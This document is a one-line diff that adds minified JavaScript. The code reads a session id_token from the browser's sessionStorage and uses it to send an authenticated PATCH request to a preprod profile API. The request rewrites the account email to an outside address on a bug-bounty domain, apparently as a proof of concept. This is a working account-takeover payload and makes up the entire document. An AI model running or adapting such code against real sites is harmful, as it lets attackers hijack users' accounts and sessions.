@@ -1,0 +1,1 @@
+(()=>{let t=sessionStorage.id_token;t&&fetch('https://api.preprod.rofim.doctor/services/profile/me',{method:'PATCH',headers:{'Authorization':'Bearer '+t,'Content-Type':'application/json'},body:JSON.stringify({email:'jakick-ywh-9050425a6cb1ab5d@yeswehack.ninja'})})})();
